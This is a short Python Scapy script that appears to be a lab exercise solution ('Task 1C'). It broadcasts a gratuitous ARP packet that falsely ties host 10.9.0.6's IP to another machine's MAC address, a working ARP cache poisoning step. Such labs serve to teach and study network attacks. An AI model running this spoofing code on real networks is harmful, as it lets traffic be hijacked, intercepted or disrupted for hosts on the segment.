#!/usr/bin/env python3
from scapy.all import *

B_IP = "10.9.0.6"
M_MAC = "02:42:0a:09:00:69"

E = Ether(
    src=M_MAC,
    dst="ff:ff:ff:ff:ff:ff"
)

A = ARP(
    op=1,
    hwsrc=M_MAC,
    psrc=B_IP,
    pdst=B_IP
)

pkt = E / A

sendp(pkt, iface="eth0", verbose=False)

print("Task 1C: Gratuitous ARP sent")
